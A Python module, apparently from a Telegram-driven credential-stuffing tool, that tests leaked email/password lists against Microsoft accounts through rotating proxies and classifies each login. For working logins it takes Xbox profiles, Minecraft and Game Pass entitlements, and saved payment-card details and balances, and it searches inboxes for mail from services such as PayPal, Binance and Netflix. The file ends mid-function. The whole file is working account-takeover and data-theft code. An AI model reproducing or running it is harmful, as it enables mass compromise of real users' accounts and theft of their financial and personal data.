"""Hotmail — MS OAuth + optional inbox/xbox/minecraft extraction."""
import json
import random
import re
import string
import threading
import time
import uuid
from collections import defaultdict
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, quote, urlparse

import requests
import urllib3
urllib3.disable_warnings()

import config
from config import log

# ═══════════════ CONSTANTS ═══════════════
CLIENT_ID = "0000000048170EF2"
SFTAG_URL = ("https://login.live.com/oauth20_authorize.srf"
             "?client_id=00000000402B5328"
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
             "&scope=service::user.auth.xboxlive.com::MBI_SSL"
             "&display=touch&response_type=token&locale=en")
TIMEOUT        = 15
SFTAG_TIMEOUT  = 8
SEARCH_TIMEOUT = 15
MAX_ATTEMPTS   = 4
# inbox mode gets extra retries because substrate token fetch can transiently
# fail — documented separately so it's obvious this isn't a mistake
INBOX_MAX_ATTEMPTS = 5

WORKING_UA = ("Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
              "Chrome/119.0.0.0 Mobile Safari/537.36")
OUTLOOK_UA = "Outlook-Android/4.618.3"

SENDER_KEYWORDS = [
    "netflix", "steam", "playstation", "epicgames", "riotgames",
    "rockstargames", "supercell", "roblox", "tiktok", "instagram",
    "discord", "spotify", "paypal", "binance", "coinbase", "amazon",
    "apple", "ubisoft", "invoice", "receipt", "order", "account",
]

# Bug 8 fix: was max(EXTRACT_THREADS, 50) = 50, but THREADS=40 so the sem
# never actually limited anything. Set to EXTRACT_THREADS (30) — that's the
# real concurrency cap for substrate searches since each inbox/full thread
# holds the sem for the duration of collect_domains.
SEARCH_SEM = threading.BoundedSemaphore(config.EXTRACT_THREADS)

DOMAIN_IN_TEXT = re.compile(
    r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}',
    re.IGNORECASE)
URL_IN_TEXT   = re.compile(r'https?://([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', re.IGNORECASE)
EMAIL_IN_TEXT = re.compile(r'[A-Za-z0-9._%+\-]+@([A-Za-z0-9.\-]+\.[A-Za-z]{2,})')

# B-08: locked/rate-limited patterns are NOT "bad password" — they're temporary
_LOCKED_PATTERNS = (
    "tried to sign in too many times",
    "your account has been locked",
    "account has been locked for",
)
_BAD_PATTERNS = (
    "password is incorrect",
    "account or password is incorrect",
    "account doesn't exist",
    "that microsoft account doesn",
    "couldn't find an account",
)

SKIP_DOMAINS = {
    "hotmail.com","outlook.com","live.com","msn.com","microsoft.com",
    "windowslive.com","passport.com","accountprotection.microsoft.com",
    "outlook.office.com","outlook.office365.com","substrate.office.com",
    "login.live.com","login.microsoftonline.com","gstatic.com",
    "googleapis.com","office.net","officeapps.live.com","w3.org",
    "microsoftonline.com","live.net","sfbassets.com","msecnd.net",
    "msftauth.net","msauth.net","msftconnecttest.com","outlookmobile.com",
    "1drv.com","sharepoint.com","office.com","bing.com","msn.net",
    "windows.com","windows.net","windowsupdate.com",
}
SKIP_CONTAINS = (
    "outlook.com","outlook.office","microsoft.com","microsoftonline",
    "officeapps.live","office.net","namprd","prod.outlook",
    "protection.outlook","msecdn","msftncsi","windowsupdate",
    "sharepoint.com","onedrive","1drv.ms",
)
VALID_TLDS = {
    "com","net","org","io","co","me","de","fr","uk","es","it","nl","be",
    "ru","jp","cn","kr","in","br","au","ca","mx","ar","ch","at","se","no",
    "dk","fi","pl","cz","gr","pt","tr","ir","sa","ae","il","za","ng","ke",
    "eg","ma","pk","bd","ph","id","th","vn","my","sg","tw","hk","info",
    "biz","app","dev","xyz","tech","online","site","store","shop","us",
    "eu","tv","cc","gg","to","ly","am","fm","ws","ai","mobi","pro",
    "edu","gov","mil","int","name","ninja","rocks","cloud","space",
}


# ═══════════════ SESSION & SMART PROXY CASCADE ═══════════════
def new_session(attempt=0, prev_proxy=None):
    s = requests.Session()
    s.verify    = False
    s.trust_env = False
    proxy_url, proxy_lbl = config.get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})
    s._proxy_url = proxy_url
    s._sid       = proxy_lbl
    s.headers.update({"User-Agent": WORKING_UA,
                      "Accept-Language": "en-US,en;q=0.9"})
    return s


_session_pool : list = []
_pool_lock             = threading.Lock()

def _recycle_session(s, attempt=0, prev_proxy=None):
    """Reset cookies + assign proxy according to the 3-tier cascade."""
    s.cookies.clear()
    proxy_url, proxy_lbl = config.get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    if proxy_url:
        s.proxies.update({"http": proxy_url, "https": proxy_url})
    else:
        s.proxies.clear()
    s._proxy_url = proxy_url
    s._sid       = proxy_lbl
    for adapter in s.adapters.values():
        try:
            for pm in adapter.proxy_manager.values():
                try: pm.clear()
                except Exception: pass
            adapter.proxy_manager.clear()
        except Exception:
            pass

def get_pooled_session(attempt=0, prev_proxy=None):
    with _pool_lock:
        if _session_pool:
            s = _session_pool.pop()
            _recycle_session(s, attempt=attempt, prev_proxy=prev_proxy)
            return s
    return new_session(attempt=attempt, prev_proxy=prev_proxy)

def return_session(s):
    with _pool_lock:
        if len(_session_pool) < config.THREADS * 2:
            _session_pool.append(s)
            return
    try: s.close()
    except: pass


# ═══════════════ MS LOGIN ═══════════════
def _extract_server_data(html):
    if not html:
        return None
    m = (re.search(r'var ServerData\s*=\s*(\{.*?\});\s*</script>', html, re.DOTALL)
         or re.search(r'var ServerData\s*=\s*(\{.*?\});', html, re.DOTALL))
    if not m:
        return None
    try:
        return json.loads(m.group(1))
    except Exception:
        return None


def _ppft_from_sfttag(html):
    if not html:
        return ""
    m = (re.search(r'name="PPFT"[^>]*?value="([^"]+)"', html)
         or re.search(r'value="([^"]+)"[^>]*?name="PPFT"', html))
    return m.group(1) if m else ""


def get_sftag(session):
    try:
        r  = session.get(SFTAG_URL, timeout=SFTAG_TIMEOUT, allow_redirects=True)
        sd = _extract_server_data(r.text or "")
        if not sd:
            return None, None
        url_post = sd.get("urlPost", "")
        ppft     = _ppft_from_sfttag(sd.get("sFTTag", ""))
        # L-05: return None,None if either is empty so ms_login gets "sftag"
        if url_post and ppft:
            return url_post, ppft
    except Exception:
        pass
    return None, None


def _try_handle_kmsi(session, html_text, current_url):
    """Handle Microsoft KMSI ('Stay signed in?' / hidden form post) to extract access_token."""
    if not html_text:
        return None
    # Check if there is a form action or urlPost in ServerData for KMSI
    sd = _extract_server_data(html_text)
    kmsi_url = (sd or {}).get("urlPost") or ""
    if not kmsi_url:
        m_act = re.search(r'<form[^>]+action="([^"]+)"', html_text, re.IGNORECASE)
        if m_act:
            kmsi_url = m_act.group(1).replace("&amp;", "&")
    if not kmsi_url:
        return None
    if kmsi_url.startswith("/"):
        parsed = urlparse(current_url)
        kmsi_url = f"{parsed.scheme}://{parsed.netloc}{kmsi_url}"

    # Extract hidden form fields (PPFT, canary, NAP, ANON, etc.)
    fields = {}
    for m_inp in re.finditer(r'<input[^>]+name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE):
        fields[m_inp.group(1)] = m_inp.group(2)
    for m_inp2 in re.finditer(r'<input[^>]+value="([^"]*)"[^>]*name="([^"]+)"', html_text, re.IGNORECASE):
        fields.setdefault(m_inp2.group(2), m_inp2.group(1))
    if sd and sd.get("sFTTag"):
        ppft = _ppft_from_sfttag(sd.get("sFTTag", ""))
        if ppft:
            fields["PPFT"] = ppft
    fields.setdefault("LoginOptions", "1")
    fields.setdefault("type", "28")

    try:
        r2 = session.post(
            kmsi_url,
            data=fields,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=True,
            timeout=TIMEOUT,
        )
        if "#" in r2.url and "access_token" in r2.url:
            tok = parse_qs(urlparse(r2.url).fragment).get("access_token", [None])[0]
            if tok:
                return tok
    except Exception:
        pass
    # Also try get_implicit_token as fallback if session cookies are now authenticated
    for sc in ("service::user.auth.xboxlive.com::MBI_SSL", "service::outlook.office.com::MBI_SSL"):
        tok = get_implicit_token(session, sc)
        if tok:
            return tok
    return None


def ms_login(session, email, password):
    url_post, sftag = get_sftag(session)
    if not url_post or not sftag:
        return None, "sftag"
    try:
        r = session.post(url_post,
                         data={"login": email, "loginfmt": email,
                               "passwd": password, "PPFT": sftag},
                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                         allow_redirects=True, timeout=TIMEOUT)
    except Exception:
        return None, "net"
    if "#" in r.url and "access_token" in r.url:
        tok = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]
        if tok:
            log("hotmail-dbg", f"ms_login SUCCESS email={email} proxy={getattr(session, '_sid', '?')}", "DEBUG")
            return tok, "success"
    body = (r.text or "").lower()

    if any(k in body for k in _LOCKED_PATTERNS):
        log("hotmail-dbg", f"ms_login LOCKED email={email} url={r.url[:120]}", "DEBUG")
        return None, "2fa"

    if any(k in body for k in _BAD_PATTERNS):
        log("hotmail-dbg", f"ms_login BAD email={email} url={r.url[:120]}", "DEBUG")
        return None, "bad"

    if any(k in body for k in (
            "account.live.com/recover", "account.live.com/identity/confirm",
            "email/confirm", "/abuse?mkt=", "/cancel?mkt=")):
        log("hotmail-dbg", f"ms_login 2FA email={email} url={r.url[:120]}", "DEBUG")
        return None, "2fa"
    if "identity/confirm" in r.url:
        log("hotmail-dbg", f"ms_login 2FA(url) email={email} url={r.url[:120]}", "DEBUG")
        return None, "2fa"

    # Handle KMSI ("Stay signed in?" /kmsi or post-login form) before classifying as unclear!
    if ("kmsi" in body or "stay signed in" in body or "keep me signed in" in body
            or "loginoptions" in body or "kmsi" in r.url.lower()
            or "ppft" in body or "wlspost" in body):
        tok_kmsi = _try_handle_kmsi(session, r.text, r.url)
        if tok_kmsi:
            log("hotmail-dbg", f"ms_login SUCCESS(KMSI) email={email} proxy={getattr(session, '_sid', '?')}", "DEBUG")
            return tok_kmsi, "success"

    if not r.text or len(r.text) < 500:
        log("hotmail-dbg", f"ms_login NET short_body={len(r.text or '')} url={r.url[:120]}", "DEBUG")
        return None, "net"
    if any(k in body for k in ("captcha", "robot", "are you human")):
        log("hotmail-dbg", f"ms_login UNCLEAR(captcha) email={email} url={r.url[:120]}", "DEBUG")
        return None, "unclear"
    if "reputationcheck" in body or "reputationcheck" in r.url:
        log("hotmail-dbg", f"ms_login UNCLEAR(repcheck) email={email} url={r.url[:120]}", "DEBUG")
        return None, "unclear"
    log("hotmail-dbg", f"ms_login UNCLEAR(unknown) email={email} url={r.url[:120]} body_len={len(r.text)}", "DEBUG")
    return None, "unclear"
    if "reputationcheck" in body or "reputationcheck" in r.url:
        if config.DEBUG_HOTMAIL:
            log("hotmail-dbg", f"ms_login UNCLEAR(repcheck) url={r.url[:120]}", "DEBUG")
        return None, "unclear"
    if config.DEBUG_HOTMAIL:
        log("hotmail-dbg", f"ms_login UNCLEAR(unknown) url={r.url[:120]} body_len={len(r.text)}", "DEBUG")
    return None, "unclear"


def get_implicit_token(session, scope):
    auth_url = (f"https://login.live.com/oauth20_authorize.srf"
                f"?client_id={CLIENT_ID}&response_type=token"
                f"&scope={quote(scope, safe='')}"
                f"&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none")
    try:
        r = session.get(auth_url, timeout=TIMEOUT, allow_redirects=True)
        if "#" in r.url:
            tok = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]
            if tok:
                return tok
    except Exception:
        pass
    return None


def get_substrate_token(session):
    try:
        session.get("https://outlook.live.com/owa/", timeout=10)
    except Exception:
        pass
    for sc in ("https://substrate.office.com/User-Internal.ReadWrite",
               "service::outlook.office.com::MBI_SSL"):
        tok = get_implicit_token(session, sc)
        if tok:
            return tok
    return None


# ═══════════════ XBOX ═══════════════
def xbox_auth(session, ms_token):
    try:
        r = session.post("https://user.auth.xboxlive.com/user/authenticate",
                         json={"Properties": {"AuthMethod": "RPS",
                                              "SiteName": "user.auth.xboxlive.com",
                                              "RpsTicket": ms_token},
                               "RelyingParty": "http://auth.xboxlive.com",
                               "TokenType": "JWT"}, timeout=TIMEOUT)
        if r.status_code == 200:
            d = r.json()
            return d.get("Token"), d["DisplayClaims"]["xui"][0]["uhs"], "ok"
        if r.status_code == 401:
            return None, None, "no_xbox"
        return None, None, "net"
    except Exception:
        return None, None, "net"


def xsts_auth(session, xbox_token, rp="http://xboxlive.com"):
    try:
        r = session.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                         json={"Properties": {"SandboxId": "RETAIL",
                                              "UserTokens": [xbox_token]},
                               "RelyingParty": rp, "TokenType": "JWT"},
                         timeout=TIMEOUT)
        if r.status_code == 200:
            return r.json().get("Token"), "ok"
        if r.status_code == 401:
            try:
                err = r.json().get("XErr", 0)
            except Exception:
                return None, "no_xbox_account"
            if err == 2148916233: return None, "no_xbox_account"
            if err == 2148916235: return None, "banned"
            if err in (2148916236, 2148916237): return None, "adult_verification"
            if err == 2148916238: return None, "child_account"
            return None, f"xsts_err_{err}"
        return None, "net"
    except Exception:
        return None, "net"


def fetch_profile(session, uhs, xsts_tok):
    try:
        hdrs = {"Authorization": f"XBL3.0 x={uhs};{xsts_tok}",
                "x-xbl-contract-version": "2",
                "Accept": "application/json"}
        r = session.get(
            "https://profile.xboxlive.com/users/me/profile/settings"
            "?settings=Gamertag,Gamerscore",
            headers=hdrs, timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            pus  = data.get("profileUsers", [])
            if not pus:
                return None, None, 0
            pu   = pus[0]
            xuid = pu.get("id")
            tag  = None; gs = 0
            for stg in pu.get("settings", []):
                if stg["id"] == "Gamertag" and stg.get("value"):
                    tag = stg["value"]
                if stg["id"] == "Gamerscore":
                    try: gs = int(stg.get("value", 0) or 0)
                    except: gs = 0
            return xuid, tag, gs
        if r.status_code == 404:
            return None, None, 0
        return "retry", None, 0
    except Exception:
        return "retry", None, 0


def fetch_games(session, uhs, xsts_tok, xuid):
    try:
        hdrs = {"Authorization": f"XBL3.0 x={uhs};{xsts_tok}",
                "x-xbl-contract-version": "2",
                "Accept": "application/json"}
        r = session.get(
            f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
            f"?maxItems=999",
            headers=hdrs, timeout=TIMEOUT)
        if r.status_code == 200:
            titles = r.json().get("titles", [])
            return [f"{i} - {t.get('name','?')} | {t.get('currentGamerscore',0)}G"
                    for i, t in enumerate(titles, 1)]
    except Exception:
        pass
    return []


def fetch_minecraft(session, xb_tok, uhs):
    mc_str = "NO"; gp_str = "NO"
    xt_mc, _ = xsts_auth(session, xb_tok, "rp://api.minecraftservices.com/")
    if not xt_mc:
        return mc_str, gp_str
    mc_tok = None
    try:
        r = session.post(
            "https://api.minecraftservices.com/authentication/login_with_xbox",
            json={"identityToken": f"XBL3.0 x={uhs};{xt_mc}"}, timeout=TIMEOUT)
        if r.status_code == 200:
            mc_tok = r.json().get("access_token")
    except Exception:
        return mc_str, gp_str
    if not mc_tok:
        return mc_str, gp_str
    try:
        r = session.get(
            "https://api.minecraftservices.com/entitlements/mcstore",
            headers={"Authorization": f"Bearer {mc_tok}"}, timeout=TIMEOUT)
        if r.status_code == 200:
            txt = r.text.lower()
            for pat, val in (
                    ("product_game_pass_ultimate", "Ultimate"),
                    ("product_game_pass_pc", "PC"),
                    ("product_game_pass_extra", "Extra"),
                    ("product_game_pass_premium", "Premium"),
                    ("product_game_pass_core", "Core"),
                    ("product_game_pass", "Standard")):
                if pat in txt:
                    gp_str = val; break
            if "product_minecraft" in txt:
                mc_str = "YES"
    except Exception:
        pass
    if mc_str == "NO":
        try:
            r = session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {mc_tok}"}, timeout=TIMEOUT)
            if r.status_code == 200:
                mc_str = "YES"
        except Exception:
            pass
    return mc_str, gp_str


def fetch_cards(session):
    delegate = None
    try:
        url = ("https://login.live.com/oauth20_authorize.srf"
               "?client_id=000000000004773A&response_type=token"
               "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
               "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2F"
               "complete-silent-delegate-auth&prompt=none")
        r = session.get(url, allow_redirects=True, timeout=TIMEOUT)
        if "access_token=" in r.url:
            delegate = parse_qs(urlparse(r.url).fragment).get(
                "access_token", [None])[0]
    except Exception:
        pass
    if not delegate:
        return "NO CC", "N/A"
    cards, balance = [], "N/A"
    hdrs = {"Authorization": f'MSADELEGATE1.0="{delegate}"',
            "Accept": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/"}
    try:
        r = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/"
            "paymentInstrumentsEx?status=active,removed&language=en-US",
            headers=hdrs, timeout=TIMEOUT)
        if r.status_code != 200:
            return "NO CC", "N/A"
        try:
            data = r.json()
        except Exception:
            data = None
        if data is not None:
            instruments = (data.get("paymentInstruments")
                           or data.get("PaymentInstruments") or [])
            if isinstance(data, list):
                instruments = data
            for inst in instruments:
                if not isinstance(inst, dict):
                    continue
                ctry = inst.get("country") or (inst.get("address") or {}).get("country") or ""
                if ctry and len(str(ctry)) == 2 and not getattr(session, "_billing_country", ""):
                    session._billing_country = str(ctry).upper()
                bal = inst.get("balance")
                if bal not in (None, "", 0, "0") and balance == "N/A":
                    try:
                        bv = float(bal)
                        if bv > 0:
                            balance = f"${bv:.2f}"
                    except Exception:
                        pass
            for inst in instruments:
                if not isinstance(inst, dict):
                    continue
                family = (inst.get("paymentMethodFamily")
                          or inst.get("cardType") or "").lower()
                if family not in ("credit_card", "debit_card", "bank_transfer",
                                  "paypal", "card"):
                    continue
                last4  = str(inst.get("last4Digits") or inst.get("last4") or "")
                first6 = str(inst.get("firstSixDigits") or "")
                em     = inst.get("expirationMonth")
                ey     = inst.get("expirationYear")
                holder = inst.get("accountHolderName")
                brand  = inst.get("cardType")
                if not last4 and not first6:
                    continue
                num = (f"{first6}******{last4}" if (first6 and last4)
                       else f"****{last4}" if last4 else first6 + "******")
                line = f"{(brand or family).upper()} | {num}"
                if em and ey: line += f" | Exp {em}/{ey}"
                if holder:    line += f" | {holder}"
                if line not in cards:
                    cards.append(line)
    except Exception:
        pass
    return (" || ".join(cards) if cards else "NO CC"), balance


def gamertag_from_token(session, ms_tok):
    # Q-05: Xbox lookup in Hotmail-Only mode is intentional — tags are
    # extra value for the user. Remove this function call in check_hotmail_only
    # if you want strictly no Xbox round-trips.
    tag, gs = None, 0
    if not ms_tok:
        return tag, gs
    xb, uhs, _ = xbox_auth(session, ms_tok)
    if xb and uhs:
        xsts_tok, _ = xsts_auth(session, xb)
        if xsts_tok:
            xuid, tag, gs = fetch_profile(session, uhs, xsts_tok)
            if xuid == "retry":
                tag, gs = None, 0
    return tag, gs


# ═══════════════ SUBSTRATE SEARCH ═══════════════
def substrate_search(session, token, cid, keyword, email=""):
    anchor = f"CID:{cid}" if cid else f"UPN:{email}" if email else "UPN:unknown"
    headers = {"Authorization": f"Bearer {token}",
               "X-AnchorMailbox": anchor,
               "Content-Type": "application/json",
               "User-Agent": OUTLOOK_UA,
               "Accept": "application/json",
               "Host": "substrate.office.com"}
    payload = {"Cvid": str(uuid.uuid4()),
               "Scenario": {"Name": "owa.react"},
               "TimeZone": "UTC",
               "TextDecorations": "Off",
               "EntityRequests": [{
                   "EntityType": "Message",
                   "ContentSources": ["Exchange"], "From": 0,
                   "Query": {"QueryString": keyword}, "Size": 25,
                   "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}],
               "QueryAlterationOptions": {"EnableSuggestion": False,
                                          "EnableAlteration": False}}
    try:
        r = session.post(
            "https://outlook.live.com/search/api/v2/query"
            "?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
            json=payload, headers=headers, timeout=SEARCH_TIMEOUT)
        if r.status_code != 200:
            return [], 0
        d  = r.json()
        es = d.get("EntitySets", [])
        if not es:
            return [], 0
        rs = es[0].get("ResultSets", [])
        if not rs:
            return [], 0
        r0 = rs[0]
        return (r0.get("Results", []) or []), (r0.get("Total") or 0)
    except Exception:
        return [], 0


def _is_valid_domain(dom):
    if not dom:
        return False
    dom = dom.lower().strip(".")
    if dom in SKIP_DOMAINS:
        return False
    if any(s in dom for s in SKIP_CONTAINS):
        return False
    parts = dom.split(".")
    if len(parts) < 2 or len(parts) > 5:
        return False
    if any(len(p) > 30 for p in parts):
        return False
    if all(p.isdigit() for p in parts):
        return False
    if parts[-1] not in VALID_TLDS:
        return False
    if len(dom) < 4 or len(dom) > 100:
        return False
    return True


def _extract_domains(text):
    """P-08: DOMAIN_IN_TEXT used as fallback only — it's a superset of the
    other two patterns, so running all three is pure wasted CPU."""
    if not text:
        return set()
    found = set()
    for m in EMAIL_IN_TEXT.finditer(text):
        dom = m.group(1).lower().strip(".")
        if _is_valid_domain(dom):
            found.add(dom)
    for m in URL_IN_TEXT.finditer(text):
        dom = m.group(1).lower().strip(".")
        if _is_valid_domain(dom):
            found.add(dom)
    if not found:
        # Fallback only when email/URL patterns found nothing
        for m in DOMAIN_IN_TEXT.finditer(text):
            dom = m.group(0).lower().strip(".")
            if _is_valid_domain(dom):
                found.add(dom)
    return found


def collect_domains(session, token, cid, email="", budget=60, job=None):
    domains  = defaultdict(int)
    seen_ids = set()
    start    = time.time()
    for kw in SENDER_KEYWORDS:
        if job and job.cancelled:
            break
        if time.time() - start > budget:
            break
        SEARCH_SEM.acquire()
        try:
            results, _ = substrate_search(session, token, cid, kw, email=email)
        finally:
            SEARCH_SEM.release()
        if not results:
            continue
        for msg in results:
            rid = msg.get("Id") or msg.get("ReferenceId")
            if not rid or rid in seen_ids:
                continue
            seen_ids.add(rid)
            blob = " ".join([msg.get("HitHighlightedSummary", "") or "",
                             msg.get("Subject", "") or "",
                             msg.get("Preview", "") or ""])
            for dom in _extract_domains(blob):
                domains[dom] += 1
    return dict(domains), len(seen_ids)


# ═══════════════ MODE CHECKERS ═══════════════
def check_hotmail_only(job, email, pw):
    prev_proxy = None
    for attempt in range(MAX_ATTEMPTS):
        if job.cancelled:
            return
        if attempt > 0:
            with job.lock: job.retried += 1
        s = get_pooled_session(attempt=attempt, prev_proxy=prev_proxy)
        prev_proxy = getattr(s, "_proxy_url", None)
        try:
            tok, st = ms_login(s, email, pw)
            if config.DEBUG_HOTMAIL:
                log("hotmail-dbg", f"hotmail_only {email} attempt={attempt} st={st}", "DEBUG")
            if st in ("success", "bad", "2fa"):
                config.report_proxy_ok(getattr(s, "_proxy_url", None))
            if st == "success":
                tag, gs = gamertag_from_token(s, tok)
                with job.lock:
                    job.valid += 1
                    if attempt > 0: job.recovered += 1
                    job.valid_list.append(
                        (email, pw, {"gamertag": tag or "", "gscore": gs, "country": config.resolve_country_code(email)}))
                return
            if st in ("bad", "2fa"):
                config.report_proxy_ok(getattr(s, "_proxy_url", None))
            if st == "bad":
                with job.lock: job.bad += 1
                return
            if st == "2fa":
                with job.lock: job.twofa += 1
                return
            if st == "unclear":
                with job.lock: job.unclear += 1
                return
            if attempt < MAX_ATTEMPTS - 1:
                time.sleep(0.5 * (2 ** attempt))
        finally:
            return_session(s)
    with job.lock: job.net += 1


def check_inbox(job, email, pw):
    no_substrate = 0
    prev_proxy = None

    for attempt in range(INBOX_MAX_ATTEMPTS):
        if job.cancelled:
            return
        if attempt > 0:
            with job.lock: job.retried += 1
        s = get_pooled_session(attempt=attempt, prev_proxy=prev_proxy)
        prev_proxy = getattr(s, "_proxy_url", None)
        try:
            tok, st = ms_login(s, email, pw)
            if config.DEBUG_HOTMAIL:
                log("hotmail-dbg", f"check_inbox {email} attempt={attempt} st={st}", "DEBUG")
            if st in ("bad", "2fa"):
                config.report_proxy_ok(getattr(s, "_proxy_url", None))
            if st == "bad":
                with job.lock: job.bad += 1
                return
            if st == "2fa":
                with job.lock: job.twofa += 1
                return
            if st == "unclear":
                with job.lock: job.unclear += 1
                return
            if st != "success":
                if attempt < INBOX_MAX_ATTEMPTS - 1:
                    time.sleep(0.5 * (2 ** min(attempt, 2)))
                continue

            tag, gs = gamertag_from_token(s, tok)
            cid = s.cookies.get("MSPCID", "")
            cid = cid.upper() if cid else None

            sub_tok = get_substrate_token(s)
            if config.DEBUG_HOTMAIL:
                log("hotmail-dbg", f"check_inbox {email} sub_tok={'OK' if sub_tok else 'FAIL'}", "DEBUG")
            if not sub_tok:
                no_substrate += 1
                if no_substrate >= 2:
                    with job.lock:
                        job.valid += 1
                        job.valid_list.append((email, pw, {
                            "gamertag": tag or "", "gscore": gs,
                            "domains": {}, "senders": {}, "total": 0,
                            "server": "substrate_fail", "country": config.resolve_country_code(email),
                        }))
                    return
                continue

            with job.lock: job.extracting += 1
            try:
                domains, msgs_seen = collect_domains(
                    s, sub_tok, cid, email=email, budget=60, job=job)
            except Exception:
                domains, msgs_seen = {}, 0
            finally:
                with job.lock:
                    job.extracting = max(0, job.extracting - 1)

            with job.lock:
                job.valid     += 1
                if attempt > 0: job.recovered += 1
                job.extracted += 1
                job.valid_list.append((email, pw, {
                    "gamertag": tag or "",
                    "gscore":   gs,
                    "domains":  domains,
                    "senders":  {},
                    "total":    msgs_seen,
                    "server":   "substrate", "country": config.resolve_country_code(email),
                }))
            return
        finally:
            return_session(s)

    with job.lock: job.net += 1


def check_full(job, email, pw):
    prev_proxy = None
    for attempt in range(MAX_ATTEMPTS):
        if job.cancelled:
            return
        if attempt > 0:
            with job.lock: job.retried += 1
        s = get_pooled_session(attempt=attempt, prev_proxy=prev_proxy)
        prev_proxy = getattr(s, "_proxy_url", None)
        try:
            tok, st = ms_login(s, email, pw)
            if config.DEBUG_HOTMAIL:
                log("hotmail-dbg", f"check_full {email} attempt={attempt} st={st}", "DEBUG")
            if st in ("bad", "2fa"):
                config.report_proxy_ok(getattr(s, "_proxy_url", None))
            if st == "bad":
                with job.lock: job.bad += 1
                return
            if st == "2fa":
                with job.lock: job.twofa += 1
                return
            if st == "unclear":
                with job.lock: job.unclear += 1
                return
            if st != "success":
                if attempt < MAX_ATTEMPTS - 1:
                    time.sleep(0.5 * (2 ** attempt))
                continue

            tag = None; gs = 0
            gamepass = "NO"; minecraft = "NO"
            cards_str = "NO CC"; balance = "N/A"
            games = []
            xuid  = None

            xb, uhs, _ = xbox_auth(s, tok)
            if xb and uhs:
                xsts_tok, _ = xsts_auth(s, xb)
                if xsts_tok:
                    xuid2, tag2, gs2 = fetch_profile(s, uhs, xsts_tok)
                    if xuid2 != "retry":
                        xuid = xuid2
                        if tag2: tag = tag2
                        if gs2:  gs  = gs2
                    mc, gp = fetch_minecraft(s, xb, uhs)
                    minecraft, gamepass = mc, gp
                    if config.DEBUG_HOTMAIL:
                        log("hotmail-dbg",
                            f"check_full {email} tag={tag} gs={gs} mc={mc} gp={gp}",
                            "DEBUG")
                    if xuid:
                        games = fetch_games(s, uhs, xsts_tok, xuid)
            cards_str, balance = fetch_cards(s)

            cid = s.cookies.get("MSPCID", "")
            cid = cid.upper() if cid else None
            domains = {}; msgs_seen = 0
            # N-05: retry substrate token — transient network blip on first attempt
            # leaves a valid full account with empty domains (same fix as check_inbox)
            sub_tok = None
            for _sub_att in range(3):
                sub_tok = get_substrate_token(s)
                if sub_tok:
                    break
                if _sub_att < 2:
                    time.sleep(0.5)
            if config.DEBUG_HOTMAIL:
                log("hotmail-dbg",
                    f"check_full {email} cards={cards_str} sub_tok={'OK' if sub_tok else 'FAIL'}",
                    "DEBUG")
            if sub_tok:
                with job.lock: job.extracting += 1
                try:
                    domains, msgs_seen = collect_domains(
                        s, sub_tok, cid, email=email, budget=60, job=job)
                except Exception:
                    domains, msgs_seen = {}, 0
                finally:
                    with job.lock:
                        job.extracting = max(0, job.extracting - 1)

            with job.lock:
                job.valid += 1
                if attempt > 0: job.recovered += 1
                # H-01: only count extraction when we actually ran collect_domains
                if sub_tok:
                    job.extracted += 1
                if gamepass != "NO":     job.gamepass   += 1
                if minecraft == "YES":   job.minecraft  += 1
                if cards_str != "NO CC": job.with_cards += 1
                # L-06: fetch_cards only returns >0 values, never "$0.0"/"$0.00"
                if balance != "N/A":
                    job.with_balance += 1
                job.valid_list.append((email, pw, {
                    "gamertag":  tag or "",
                    "gscore":    gs,
                    "gamepass":  gamepass,
                    "minecraft": minecraft,
                    "cards":     cards_str,
                    "balance":   balance,
                    "games":     games,
                    "domains":   domains,
                    "senders":   {},
                    "total":     msgs_seen,
                    # N-02: reflect actual extraction outcome
                    "server":    "substrate" if sub_tok else "substrate_fail",
                    "country":   getattr(s, "_billing_country", "") or config.resolve_country_code(email),
                }))
            return
        finally:
            return_session(s)
    with job.lock: job.net += 1


# ═══════════════ RUN ═══════════════
def _safe_check(fn, job, email, pw):
    try:
        fn(job, email, pw)
    except Exception as e:
        log("hotmail", f"{type(e).__name__}: {e}", "ERROR")
        with job.lock:
            job.net += 1
    finally:
        with job.lock:
            job.done_keys.add((email.lower(), pw))



def run(job, reporter):
    fn = {"hotmail": check_hotmail_only,
          "inbox":   check_inbox,
          "full":    check_full}.get(job.mode)
    if fn is None:
        log("hotmail", f"unknown mode {job.mode}", "ERROR")
        return

    log("hotmail", f"start chat={job.chat_id} mode={job.mode} "
                   f"combos={len(job.combos)} workers={config.THREADS}", "INFO")

    done_evt = threading.Event()

    def _progress_watcher():
        while not done_evt.is_set():
            try:
                reporter()
            except Exception as e:
                log("hotmail", f"reporter: {e}", "WARN")
            done_evt.wait(3)

    watcher = threading.Thread(target=_progress_watcher, daemon=True)
    watcher.start()

    # Chunked submission: keep at most THREADS*2 futures alive at once.
    # Avoids loading 500k future objects into RAM for large combo lists.
    try:
